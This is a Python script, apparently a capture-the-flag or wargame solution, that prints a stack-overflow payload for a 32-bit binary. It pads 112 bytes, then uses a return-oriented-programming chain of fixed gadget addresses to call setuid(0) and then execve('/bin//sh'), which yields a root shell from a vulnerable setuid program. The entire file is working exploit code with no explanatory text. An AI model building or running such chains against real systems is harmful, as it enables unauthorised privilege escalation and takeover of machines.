import sys
sys.stdout.buffer.write(b'A'*112)

# setuid
sys.stdout.buffer.write(0x080481d1.to_bytes(4,'little')) # pop ebx ; ret
sys.stdout.buffer.write(0xffffffff.to_bytes(4,'little')) # data
sys.stdout.buffer.write(0x0805e27b.to_bytes(4,'little')) # inc ebx ; ret
sys.stdout.buffer.write(0x080563d0.to_bytes(4,'little')) # xor eax, eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
sys.stdout.buffer.write(0x08049893.to_bytes(4,'little')) # int 0x80


# execve
sys.stdout.buffer.write(0x0807299b.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de060.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080ac7b6.to_bytes(4,'little'))
sys.stdout.buffer.write(b"/bin")
sys.stdout.buffer.write(0x08056e15.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0807299b.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de064.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080ac7b6.to_bytes(4,'little'))
sys.stdout.buffer.write(b"//sh")
sys.stdout.buffer.write(0x08056e15.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0807299b.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de068.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080563d0.to_bytes(4,'little'))
sys.stdout.buffer.write(0x08056e15.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080481d1.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de060.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080729c2.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de068.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de060.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0807299b.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080de068.to_bytes(4,'little'))
sys.stdout.buffer.write(0x080563d0.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little'))
sys.stdout.buffer.write(0x08049893.to_bytes(4,'little'))